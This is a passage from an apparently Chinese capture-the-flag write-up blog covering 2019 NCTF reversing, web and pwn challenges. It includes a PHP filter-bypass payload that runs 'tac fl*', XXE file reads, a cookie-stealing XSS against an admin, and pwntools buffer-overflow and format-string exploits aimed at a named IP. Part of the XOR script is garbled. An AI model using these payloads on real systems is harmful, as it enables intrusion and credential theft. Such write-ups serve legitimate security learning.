class="number">6</span> * flag[<span class="number">15</span>] + <span class="number">23</span> * flag[<span class="number">14</span>] + <span class="number">14</span> * flag[<span class="number">16</span>] + <span class="number">74</span> * flag[<span class="number">17</span>] + <span class="number">12</span> * flag[<span class="number">19</span>] + <span class="number">83</span> * flag[<span class="number">20</span>])</span><br><span class="line">solver.add(str[<span class="number">21</span>] == <span class="number">15</span> * flag[<span class="number">19</span>] + <span class="number">48</span> * flag[<span class="number">18</span>] + <span class="number">92</span> * flag[<span class="number">16</span>] + <span class="number">85</span> * flag[<span class="number">15</span>] + <span class="number">27</span> * flag[<span class="number">14</span>] + <span class="number">42</span> * flag[<span class="number">17</span>] + <span class="number">72</span> * flag[<span class="number">20</span>])</span><br><span class="line">solver.add(str[<span class="number">22</span>] == <span class="number">26</span> * flag[<span class="number">19</span>] + <span class="number">67</span> * flag[<span class="number">17</span>] + <span class="number">6</span> * flag[<span class="number">15</span>] + <span class="number">4</span> * flag[<span class="number">14</span>] + <span class="number">3</span> * flag[<span class="number">16</span>] + <span class="number">68</span> * flag[<span class="number">20</span>])</span><br><span class="line">solver.add(str[<span class="number">23</span>] == <span class="number">34</span> * flag[<span class="number">24</span>] + <span class="number">12</span> * flag[<span class="number">21</span>] + <span class="number">53</span> * flag[<span class="number">22</span>] + <span class="number">6</span> * flag[<span class="number">23</span>] + <span class="number">58</span> * flag[<span class="number">25</span>] + <span class="number">36</span> * flag[<span class="number">26</span>] + flag[<span class="number">27</span>])</span><br><span class="line">solver.add(str[<span class="number">24</span>] == <span class="number">27</span> * flag[<span class="number">25</span>] + <span class="number">73</span> * flag[<span class="number">24</span>] + <span class="number">12</span> * flag[<span class="number">23</span>] + <span class="number">83</span> * flag[<span class="number">21</span>] + <span class="number">85</span> * flag[<span class="number">22</span>] + <span class="number">96</span> * flag[<span class="number">26</span>] + <span class="number">52</span> * flag[<span class="number">27</span>])</span><br><span class="line">solver.add(str[<span class="number">25</span>] == <span class="number">24</span> * flag[<span class="number">23</span>] + <span class="number">78</span> * flag[<span class="number">21</span>] + <span class="number">53</span> * flag[<span class="number">22</span>] + <span class="number">36</span> * flag[<span class="number">24</span>] + <span class="number">86</span> * flag[<span class="number">25</span>] + <span class="number">25</span> * flag[<span class="number">26</span>] + <span class="number">46</span> * flag[<span class="number">27</span>])</span><br><span class="line">solver.add(str[<span class="number">26</span>] == <span class="number">78</span> * flag[<span class="number">22</span>] + <span class="number">39</span> * flag[<span class="number">21</span>] + <span class="number">52</span> * flag[<span class="number">23</span>] + <span class="number">9</span> * flag[<span class="number">24</span>] + <span class="number">62</span> * flag[<span class="number">25</span>] + <span class="number">37</span> * flag[<span class="number">26</span>] + <span class="number">84</span> * flag[<span class="number">27</span>])</span><br><span class="line">solver.add(str[<span class="number">27</span>] == <span class="number">48</span> * flag[<span class="number">25</span>] + <span class="number">6</span> * flag[<span class="number">22</span>] + <span class="number">23</span> * flag[<span class="number">21</span>] + <span class="number">14</span> * flag[<span class="number">23</span>] + <span class="number">74</span> * flag[<span class="number">24</span>] + <span class="number">12</span> * flag[<span class="number">26</span>] + <span class="number">83</span> * flag[<span class="number">27</span>])</span><br><span class="line">solver.add(str[<span class="number">28</span>] == <span class="number">15</span> * flag[<span class="number">26</span>] + <span class="number">48</span> * flag[<span class="number">25</span>] + <span class="number">92</span> * flag[<span class="number">23</span>] + <span class="number">85</span> * flag[<span class="number">22</span>] + <span class="number">27</span> * flag[<span class="number">21</span>] + <span class="number">42</span> * flag[<span class="number">24</span>] + <span class="number">72</span> * flag[<span class="number">27</span>])</span><br><span class="line">solver.add(str[<span class="number">29</span>] == <span class="number">26</span> * flag[<span class="number">26</span>] + <span class="number">67</span> * flag[<span class="number">24</span>] + <span class="number">6</span> * flag[<span class="number">22</span>] + <span class="number">4</span> * flag[<span class="number">21</span>] + <span class="number">3</span> * flag[<span class="number">23</span>] + <span class="number">68</span> * flag[<span class="number">27</span>])</span><br><span class="line">solver.add(str[<span class="number">30</span>] == <span class="number">34</span> * flag[<span class="number">31</span>] + <span class="number">12</span> * flag[<span class="number">28</span>] + <span class="number">53</span> * flag[<span class="number">29</span>] + <span class="number">6</span> * flag[<span class="number">30</span>] + <span class="number">58</span> * flag[<span class="number">32</span>] + <span class="number">36</span> * flag[<span class="number">33</span>] + flag[<span class="number">34</span>])</span><br><span class="line">solver.add(str[<span class="number">31</span>] == <span class="number">27</span> * flag[<span class="number">32</span>] + <span class="number">73</span> * flag[<span class="number">31</span>] + <span class="number">12</span> * flag[<span class="number">30</span>] + <span class="number">83</span> * flag[<span class="number">28</span>] + <span class="number">85</span> * flag[<span class="number">29</span>] + <span class="number">96</span> * flag[<span class="number">33</span>] + <span class="number">52</span> * flag[<span class="number">34</span>])</span><br><span class="line">solver.add(str[<span class="number">32</span>] == <span class="number">24</span> * flag[<span class="number">30</span>] + <span class="number">78</span> * flag[<span class="number">28</span>] + <span class="number">53</span> * flag[<span class="number">29</span>] + <span class="number">36</span> * flag[<span class="number">31</span>] + <span class="number">86</span> * flag[<span class="number">32</span>] + <span class="number">25</span> * flag[<span class="number">33</span>] + <span class="number">46</span> * flag[<span class="number">34</span>])</span><br><span class="line">solver.add(str[<span class="number">33</span>] == <span class="number">78</span> * flag[<span class="number">29</span>] + <span class="number">39</span> * flag[<span class="number">28</span>] + <span class="number">52</span> * flag[<span class="number">30</span>] + <span class="number">9</span> * flag[<span class="number">31</span>] + <span class="number">62</span> * flag[<span class="number">32</span>] + <span class="number">37</span> * flag[<span class="number">33</span>] + <span class="number">84</span> * flag[<span class="number">34</span>])</span><br><span class="line">solver.add(str[<span class="number">34</span>] == <span class="number">48</span> * flag[<span class="number">32</span>] + <span class="number">6</span> * flag[<span class="number">29</span>] + <span class="number">23</span> * flag[<span class="number">28</span>] + <span class="number">14</span> * flag[<span class="number">30</span>] + <span class="number">74</span> * flag[<span class="number">31</span>] + <span class="number">12</span> * flag[<span class="number">33</span>] + <span class="number">83</span> * flag[<span class="number">34</span>])</span><br><span class="line">solver.add(str[<span class="number">35</span>] == <span class="number">15</span> * flag[<span class="number">33</span>] + <span class="number">48</span> * flag[<span class="number">32</span>] + <span class="number">92</span> * flag[<span class="number">30</span>] + <span class="number">85</span> * flag[<span class="number">29</span>] + <span class="number">27</span> * flag[<span class="number">28</span>] + <span class="number">42</span> * flag[<span class="number">31</span>] + <span class="number">72</span> * flag[<span class="number">34</span>])</span><br><span class="line">solver.add(str[<span class="number">36</span>] == <span class="number">26</span> * flag[<span class="number">33</span>] + <span class="number">67</span> * flag[<span class="number">31</span>] + <span class="number">6</span> * flag[<span class="number">29</span>] + <span class="number">4</span> * flag[<span class="number">28</span>] + <span class="number">3</span> * flag[<span class="number">30</span>] + <span class="number">68</span> * flag[<span class="number">34</span>])</span><br><span class="line">solver.add(str[<span class="number">37</span>] == <span class="number">34</span> * flag[<span class="number">38</span>] + <span class="number">12</span> * flag[<span class="number">35</span>] + <span class="number">53</span> * flag[<span class="number">36</span>] + <span class="number">6</span> * flag[<span class="number">37</span>] + <span class="number">58</span> * flag[<span class="number">39</span>] + <span class="number">36</span> * flag[<span class="number">40</span>] + flag[<span class="number">41</span>])</span><br><span class="line">solver.add(str[<span class="number">38</span>] == <span class="number">27</span> * flag[<span class="number">39</span>] + <span class="number">73</span> * flag[<span class="number">38</span>] + <span class="number">12</span> * flag[<span class="number">37</span>] + <span class="number">83</span> * flag[<span class="number">35</span>] + <span class="number">85</span> * flag[<span class="number">36</span>] + <span class="number">96</span> * flag[<span class="number">40</span>] + <span class="number">52</span> * flag[<span class="number">41</span>])</span><br><span class="line">solver.add(str[<span class="number">39</span>] == <span class="number">24</span> * flag[<span class="number">37</span>] + <span class="number">78</span> * flag[<span class="number">35</span>] + <span class="number">53</span> * flag[<span class="number">36</span>] + <span class="number">36</span> * flag[<span class="number">38</span>] + <span class="number">86</span> * flag[<span class="number">39</span>] + <span class="number">25</span> * flag[<span class="number">40</span>] + <span class="number">46</span> * flag[<span class="number">41</span>])</span><br><span class="line">solver.add(str[<span class="number">40</span>] == <span class="number">78</span> * flag[<span class="number">36</span>] + <span class="number">39</span> * flag[<span class="number">35</span>] + <span class="number">52</span> * flag[<span class="number">37</span>] + <span class="number">9</span> * flag[<span class="number">38</span>] + <span class="number">62</span> * flag[<span class="number">39</span>] + <span class="number">37</span> * flag[<span class="number">40</span>] + <span class="number">84</span> * flag[<span class="number">41</span>])</span><br><span class="line">solver.add(str[<span class="number">41</span>] == <span class="number">48</span> * flag[<span class="number">39</span>] + <span class="number">6</span> * flag[<span class="number">36</span>] + <span class="number">23</span> * flag[<span class="number">35</span>] + <span class="number">14</span> * flag[<span class="number">37</span>] + <span class="number">74</span> * flag[<span class="number">38</span>] + <span class="number">12</span> * flag[<span class="number">40</span>] + <span class="number">83</span> * flag[<span class="number">41</span>])</span><br><span class="line">solver.add(str[<span class="number">42</span>] == <span class="number">15</span> * flag[<span class="number">40</span>] + <span class="number">48</span> * flag[<span class="number">39</span>] + <span class="number">92</span> * flag[<span class="number">37</span>] + <span class="number">85</span> * flag[<span class="number">36</span>] + <span class="number">27</span> * flag[<span class="number">35</span>] + <span class="number">42</span> * flag[<span class="number">38</span>] + <span class="number">72</span> * flag[<span class="number">41</span>])</span><br><span class="line">solver.add(str[<span class="number">43</span>] == <span class="number">26</span> * flag[<span class="number">40</span>] + <span class="number">67</span> * flag[<span class="number">38</span>] + <span class="number">6</span> * flag[<span class="number">36</span>] + <span class="number">4</span> * flag[<span class="number">35</span>] + <span class="number">3</span> * flag[<span class="number">37</span>] + <span class="number">68</span> * flag[<span class="number">41</span>])</span><br><span class="line">solver.add(str[<span class="number">44</span>] == <span class="number">34</span> * flag[<span class="number">45</span>] + <span class="number">12</span> * flag[<span class="number">42</span>] + <span class="number">53</span> * flag[<span class="number">43</span>] + <span class="number">6</span> * flag[<span class="number">44</span>] + <span class="number">58</span> * flag[<span class="number">46</span>] + <span class="number">36</span> * flag[<span class="number">47</span>] + flag[<span class="number">48</span>])</span><br><span class="line">solver.add(str[<span class="number">45</span>] == <span class="number">27</span> * flag[<span class="number">46</span>] + <span class="number">73</span> * flag[<span class="number">45</span>] + <span class="number">12</span> * flag[<span class="number">44</span>] + <span class="number">83</span> * flag[<span class="number">42</span>] + <span class="number">85</span> * flag[<span class="number">43</span>] + <span class="number">96</span> * flag[<span class="number">47</span>] + <span class="number">52</span> * flag[<span class="number">48</span>])</span><br><span class="line">solver.add(str[<span class="number">46</span>] == <span class="number">24</span> * flag[<span class="number">44</span>] + <span class="number">78</span> * flag[<span class="number">42</span>] + <span class="number">53</span> * flag[<span class="number">43</span>] + <span class="number">36</span> * flag[<span class="number">45</span>] + <span class="number">86</span> * flag[<span class="number">46</span>] + <span class="number">25</span> * flag[<span class="number">47</span>] + <span class="number">46</span> * flag[<span class="number">48</span>])</span><br><span class="line">solver.add(str[<span class="number">47</span>] == <span class="number">78</span> * flag[<span class="number">43</span>] + <span class="number">39</span> * flag[<span class="number">42</span>] + <span class="number">52</span> * flag[<span class="number">44</span>] + <span class="number">9</span> * flag[<span class="number">45</span>] + <span class="number">62</span> * flag[<span class="number">46</span>] + <span class="number">37</span> * flag[<span class="number">47</span>] + <span class="number">84</span> * flag[<span class="number">48</span>])</span><br><span class="line">solver.add(str[<span class="number">48</span>] == <span class="number">48</span> * flag[<span class="number">46</span>] + <span class="number">6</span> * flag[<span class="number">43</span>] + <span class="number">23</span> * flag[<span class="number">42</span>] + <span class="number">14</span> * flag[<span class="number">44</span>] + <span class="number">74</span> * flag[<span class="number">45</span>] + <span class="number">12</span> * flag[<span class="number">47</span>] + <span class="number">83</span> * flag[<span class="number">48</span>])</span><br><span class="line">solver.add(str[<span class="number">49</span>] == <span class="number">15</span> * flag[<span class="number">47</span>] + <span class="number">48</span> * flag[<span class="number">46</span>] + <span class="number">92</span> * flag[<span class="number">44</span>] + <span class="number">85</span> * flag[<span class="number">43</span>] + <span class="number">27</span> * flag[<span class="number">42</span>] + <span class="number">42</span> * flag[<span class="number">45</span>] + <span class="number">72</span> * flag[<span class="number">48</span>])</span><br><span class="line">solver.add(str[<span class="number">50</span>] == <span class="number">26</span> * flag[<span class="number">47</span>] + <span class="number">67</span> * flag[<span class="number">45</span>] + <span class="number">6</span> * flag[<span class="number">43</span>] + <span class="number">4</span> * flag[<span class="number">42</span>] + <span class="number">3</span> * flag[<span class="number">44</span>] + <span class="number">68</span> * flag[<span class="number">48</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    s = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">49</span>):</span><br><span class="line">        s.append(m[flag[i]].as_long())</span><br><span class="line">    print(bytes(s))</span><br><span class="line">    <span class="keyword">print</span> s</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'error'</span>)</span><br><span class="line"></span><br><span class="line">str=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    str+=chr(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> str</span><br></pre></td></tr></table></figure>
<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125202546147.png" alt="image-20191125202546147"></p>
<p>ida查看反编译源码，<strong>发现输入直接和字符串</strong>s**</p>
<h3 id="Our-16bit-Games"><a href="#Our-16bit-Games" class="headerlink" title="Our 16bit Games"></a>Our 16bit Games</h3><p>ida反编译在程序末尾发现一连串输出，其将一连串数据分别与ds：0fa2、ds：0fa4的值进行异或，应该就是flag了</p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125203551803.png" alt="image-20191125203551803"></p>
<p>通过反推，发现ds：0fa2位置的参数通过了一连串检验，由检验算法可推出关键参数，c0h、deh</p>
<p><img src="C:\Users\浅夏丶曦白\AppData\Roaming\Typora\typora-user-images\image-20191125204003878.png" alt="image-20191125204003878"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a=[<span class="number">0x8E</span>, <span class="number">0x9D</span>, <span class="number">0xDA</span>, xCD, <span class="number">0x21</span>, <span class="number">0x86</span>, <span class="number">0xDF</span>, <span class="number">0xB4</span>, <span class="number">0x02</span>, <span class="number">0x94</span>, <span class="number">0x21</span>, <span class="number">0x86</span>, <span class="number">0xDF</span>, <span class="number">0xB4</span>, x02, <span class="number">0x98</span>, , <span class="number">0xBB</span>, , <span class="number">0x89</span>, , <span class="number">0xF3</span>, , <span class="number">0xEF</span>, , <span class="number">0x83</span>, , <span class="number">0xEE</span>, , <span class="number">0xAD</span>, <span class="number">0xB2</span>, <span class="number">0x9B</span>,<span class="number">0x9F</span>, ,<span class="number">0xEC</span>, , <span class="number">0x9F</span>,<span class="number">0x9A</span>, <span class="number">0xF0</span>, , <span class="number">0xEB</span>,<span class="number">0x9F</span>, ,<span class="number">0x97</span>, , <span class="number">0xF6</span>,<span class="number">0xBC</span>, ,<span class="number">0xF1</span>, <span class="number">0xE9</span>,<span class="number">0x9F</span>, ,<span class="number">0xE7</span>, , <span class="number">0xA1</span>,<span class="number">0xB3</span>, <span class="number">0xF3</span>, <span class="number">0xA3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        a[i]=a[i]^<span class="number">0xc0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a[i]=a[i]^<span class="number">0xde</span></span><br></pre></td></tr></table></figure>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h3><p>题目提示flag在/flag<br>填写user和passwd之后抓包，经过测试在user处存在xxe<br>直接读flag</p>
<h3 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h3><p>和上题一样xxe，提示要用xxe做更多东西<br>尝试下内网探测</p>
<h3 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h3><p>第一关 绕过正则 num=23333%0a<br>第二关 str1纯数字，md5后str1和str2不相等，把cxhp换成0123后弱相等<br>写脚本跑出一个开头0e或者ce,后面字符串经过替换后为纯数字的纯数字字符串就是str1<br>Str1=9427417<br>Str2和str1类似，开头开头0e或者ce,后面字符串经过替换后为纯数字的字符串即为str2（str1和str2经过md5后不能同时0e开头且后面字符串为纯数字）<br>Str2=q0000653f8c<br>第三关<br>php中.会解析成_，q.w.q绕过第一个if<br>第二个if貌似没什么用<br>第三个if不能用cat<br>而且命令长度不能大于8<br>Ls看下当前目录发现flag文件，忘了叫啥名字挺长超过8了fl开头的<br>用通配符可以绕过<br>Cmd=tac fl<em><br>Payload: num=23333%0a&amp;str1=9427417&amp;str2=q0000653f8c&amp;q.w.q=tac%20fl</em><br>Simple Xss<br>注册账号，登陆，发现可以给任何人发送消息，简单测试消息处存在xss<br>无任何过滤<br>给admin发打cookie的xss<br>抓到cookie浏览器修改本地cookie，F5,flag到手。。</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello pwn"></a>hello pwn</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"139.129.76.65"</span>,<span class="number">50003</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn-me-years-I"><a href="#pwn-me-years-I" class="headerlink" title="pwn me  years!(I)"></a>pwn me  years!(I)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#r = process("./pwn_me_1")</span></span><br><span class="line">r = remote(<span class="string">'139.129.76.65'</span>,<span class="number">50004</span>)</span><br><span class="line">payload = <span class="string">'yes\x00'</span> + <span class="string">'a'</span>*<span class="number">12</span> + p64(<span class="number">0x66666666</span>) + <span class="string">'\x00'</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn-me-years-II"><a href="#pwn-me-years-II" class="headerlink" title="pwn me years!(II)"></a>pwn me years!(II)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#r = process('./2')</span></span><br><span class="line">r = remote(<span class="string">'139.129.76.65'</span>,<span class="number">50005</span>)</span><br><span class="line">offset = <span class="number">0x10</span></span><br><span class="line">r.recvuntil(<span class="string">'your name:\n'</span>)</span><br><span class="line">r.sendline(<span class="string">'a'</span> * offset + <span class="string">'%p'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'ring......\n'</span>)</span><br><span class="line">get = r.recv(<span class="number">14</span>)</span><br><span class="line"><span class="comment">#get = u64(r.recv()[0:6].ljust(8,'\x00'))</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'leak = '</span> + get</span><br><span class="line">get = int(get,<span class="number">16</span>) - <span class="number">0x202080</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'addr = '</span> + hex(get)</span><br><span class="line">target = get + <span class="number">0x0000000002020E0</span></span><br><span class="line">one = <span class="number">0x66666666</span></span><br><span class="line">target_len = len(str(target))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'target = '</span> + hex(target)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%"</span> + str(<span class="number">0x6666</span>) + <span class="string">"c%9$hn%10$hn"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x18</span>,<span class="string">"\x00"</span>)</span><br><span class="line">payload += p64(target) + p64(target+<span class="number">2</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">payload="%" + str((one&gt;&gt;16)&amp;0xffff)+'c'+"%9$hn"</span></span><br><span class="line"><span class="string">payload+=p64(target+2)</span></span><br><span class="line"><span class="string">r.recvuntil('you want?\n')</span></span><br><span class="line"><span class="string">gdb.attach(r)</span></span><br><span class="line"><span class="string">r.sendline(payload)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                <source type="audio/mpeg" src>
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title="0" data-url="http://music.163.com/song/media/outer/url?id=490182455.mp3"></li>
                        
                    
                        
                            <li title="1" data-url="http://music.163.com/song/media/outer/url?id=490182454.mp3"></li>
                        
                    
                </ul>
            
        </div>
        
    <div id="gitalk-container" class="comment link" data-ae="true" data-ci="5cd24ed310c0cbc2a2ed" data-cs="51aa998e509794b7b061784f1f3d41018af118f6" data-r="xikong-mubai.github.io" data-o="xikong-mubai" data-a="xikong-mubai" data-d="false">查看评论</div>


    </div>
    
        <div class="side">
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2019-NCTF"><span class="toc-number">1.</span> <span class="toc-text">2019-NCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#问卷调查"><span class="toc-number">1.1.1.</span> <span class="toc-text">问卷调查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pip-install"><span class="toc-number">1.1.2.</span> <span class="toc-text">pip install</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#a-good-idea"><span class="toc-number">1.1.3.</span> <span class="toc-text">a_good_idea</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#键盘侠"><span class="toc-number">1.1.4.</span> <span class="toc-text">键盘侠</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#what‘s-this"><span class="toc-number">1.1.5.</span> <span class="toc-text">what‘s this</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Keyboard"><span class="toc-number">1.2.1.</span> <span class="toc-text">Keyboard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyrsa"><span class="toc-number">1.2.2.</span> <span class="toc-text">babyrsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#childyrsa"><span class="toc-number">1.2.3.</span> <span class="toc-text">childyrsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sore"><span class="toc-number">1.2.4.</span> <span class="toc-text">sore</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re"><span class="toc-number">1.3.</span> <span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#签到"><span class="toc-number">1.3.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debug"><span class="toc-number">1.3.2.</span> <span class="toc-text">debug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Our-16bit-Games"><span class="toc-number">1.3.3.</span> <span class="toc-text">Our 16bit Games</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.4.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fake-XML-cookbook"><span class="toc-number">1.4.1.</span> <span class="toc-text">Fake XML cookbook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#True-XML-cookbook"><span class="toc-number">1.4.2.</span> <span class="toc-text">True XML cookbook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easyphp"><span class="toc-number">1.4.3.</span> <span class="toc-text">Easyphp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">1.5.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-pwn"><span class="toc-number">1.5.1.</span> <span class="toc-text">hello pwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn-me-years-I"><span class="toc-number">1.5.2.</span> <span class="toc-text">pwn me  years!(I)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn-me-years-II"><span class="toc-number">1.5.3.</span> <span class="toc-text">pwn me years!(II)</span></a></li></ol></li></ol></li></ol>
        </div>
    
</div>




    </div>
</div>
</body>
    <!--血小板代码-->
    <link rel="stylesheet" href="/live2d/css/live2d.css" />
    <div id="landlord">
        <div class="message" style="opacity:0"></div>
        <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
        <div class="hide-button">隐藏</div>
    </div>
    <script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript">
        var message_Path = '/live2d/'
        var home_Path = 'https://calmcenter.club/'
    </script>
    <script type="text/javascript" src="/live2d/js/live2d.js"></script>
    <script type="text/javascript" src="/live2d/js/message.js"></script>
    <script type="text/javascript">
        loadlive2d("live2d", "/live2d/model/kesshouban_v2/model.json");
    </script>
    <!--血小板代码-->
<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/diaspora.js"></script>
<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
